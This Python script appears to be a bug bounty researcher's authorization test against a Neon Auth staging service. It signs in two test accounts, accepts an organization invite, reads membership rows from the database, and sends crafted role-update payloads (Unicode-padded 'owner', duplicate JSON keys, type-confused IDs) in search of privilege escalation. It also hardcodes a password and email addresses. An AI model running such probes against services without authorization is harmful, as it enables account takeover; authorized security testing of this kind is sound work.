# -*- coding: utf-8 -*-
"""V24 final: accept via invitationId then body-deep probes on U2 membership.
(U1 owner of org cf373aa2; U2 target member)"""
import json, ssl, time, http.client

NA_HOST = "ep-crimson-fog-w2gucld1.neonauth.us-east-2.aws.neon.build"
ctx = ssl.create_default_context()
PASS = "SecTest!2026pass"
U1 = "libobo1229+na_org1@gmail.com"
U2 = "libobo1229+na_org2@gmail.com"
ORG = "cf373aa2-4548-41c6-9215-c9e66dc65360"


def out(s):
    print("[%s] %s" % (time.strftime("%H:%M:%S"), s), flush=True)


def na(method, path, body=None, cookie=None, origin="http://localhost:3000",
      raw=None, timeout=25):
    conn = http.client.HTTPSConnection(NA_HOST, timeout=timeout, context=ctx)
    hdrs = {"Content-Type": "application/json", "Origin": origin,
            "User-Agent": "Mozilla/5.0", "Accept": "application/json"}
    if cookie:
        hdrs["Cookie"] = cookie
    payload = raw.encode() if raw is not None else (json.dumps(body).encode() if body is not None else None)
    conn.request(method, path, payload, headers=hdrs)
    resp = conn.getresponse()
    data = resp.read().decode("utf-8", "replace")
    ck = resp.getheader("Set-Cookie", "")
    conn.close()
    time.sleep(0.25)
    return resp.status, data, ck


def auth(email):
    st, d, ck = na("POST", "/neondb/auth/sign-in/email", {"email": email, "password": PASS})
    return ck.split(";")[0] if st in (200, 201) else None


def main():
    out("== V24 body deep final ==")
    c1 = auth(U1)
    c2 = auth(U2)
    out("cookies: %s/%s" % (bool(c1), bool(c2)))
    if not (c1 and c2):
        return
    # list pending invite -> id
    st, d, _ = na("GET", "/neondb/auth/organization/list-invitations?organizationId=%s" % ORG, cookie=c1)
    invs = json.loads(d)
    out("pending: %s" % str(invs)[:250])
    iid = None
    for i in invs:
        if i.get("email") == U2 and i.get("status") == "pending":
            iid = i.get("id") or i.get("invitationId")
    out("invitationId=%s" % iid)
    if iid:
        st, d, _ = na("POST", "/neondb/auth/organization/accept-invitation",
                      {"invitationId": iid}, c2)
        out("U2 accept -> %d %s" % (st, d[:150]))
    else:
        out("no pending invite (U2 may already be member) - skip accept")
    # members list endpoint 404 -> fetch memberId via DB
    import psycopg
    from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlencode
    import http.client as hc
    conn = hc.HTTPSConnection("console-stage.neon.build", timeout=30, context=ctx)
    conn.request("GET", "/api/v2/projects/orange-sun-90493739/connection_uri"
                 "?database_name=neondb&role_name=neondb_owner"
                 "&branch_id=br-wandering-field-w2ob6mpn",
                 headers={"X-Bug-Bounty": "xxbo",
                          "Authorization": "Bearer " + json.load(open(r"F:\scan\neon_report\_apikey.json"))["key"]})
    r = conn.getresponse()
    uri = json.loads(r.read().decode())["uri"]
    conn.close()
    p = urlsplit(uri)
    q = [(k, v) for k, v in parse_qsl(p.query) if k != "channel_binding"]
    uri2 = urlunsplit((p.scheme, p.netloc, p.path, urlencode(q), p.fragment))
    with psycopg.connect(uri2, connect_timeout=15) as dbc:
        dbc.autocommit = True
        with dbc.cursor() as cur:
            cur.execute('SELECT id, role FROM neon_auth.member WHERE "organizationId"=%s AND "userId"=%s',
                        (ORG, "66b42c6b-c41e-4c5a-a2fa-aa5957cfaec0"))
            rows = cur.fetchall()
    if not rows:
        out("U2 member row not found")
        return
    mid, mrole = str(rows[0][0]), rows[0][1]
    out("U2 memberId=%s role=%s" % (mid, mrole))
    probes = [
        ("role=owner U+3000", {"memberId": mid, "role": "owner\u3000"}),
        ("role=owner NBSP", {"memberId": mid, "role": "owner\u00a0"}),
        ("role=owner EM", {"memberId": mid, "role": "owner\u2003"}),
        ("role=member ctrl", {"memberId": mid, "role": "member"}),
        ("memberId=123", {"memberId": 123, "role": "member"}),
        ("memberId=null", {"memberId": None, "role": "member"}),
        ("memberId=array", {"memberId": [mid], "role": "member"}),
        ("role=array", {"memberId": mid, "role": ["owner"]}),
        ("dup role o,m", '{"memberId":"%s","role":"owner","role":"member"}' % mid),
        ("dup role m,o", '{"memberId":"%s","role":"member","role":"owner"}' % mid),
        ("extra field", {"memberId": mid, "role": "member", "admin": True}),
    ]
    for tag, b in probes:
        if isinstance(b, str):
            st, data, _ = na("POST", "/neondb/auth/organization/update-member-role",
                             raw=b, cookie=c1)
        else:
            st, data, _ = na("POST", "/neondb/auth/organization/update-member-role",
                             b, cookie=c1)
        out("%-18s -> %s %s" % (tag, st, data[:90]))
    # post-check via members list
    st, d, _ = na("GET", "/neondb/auth/organization/members?organizationId=%s" % ORG, cookie=c1)
    out("final members: %s" % d[:300])
    # cleanup org
    st, d, _ = na("POST", "/neondb/auth/organization/delete", {"organizationId": ORG}, c1)
    out("cleanup delete -> %s %s" % (st, d[:90]))
    out("done")


if __name__ == "__main__":
    main()
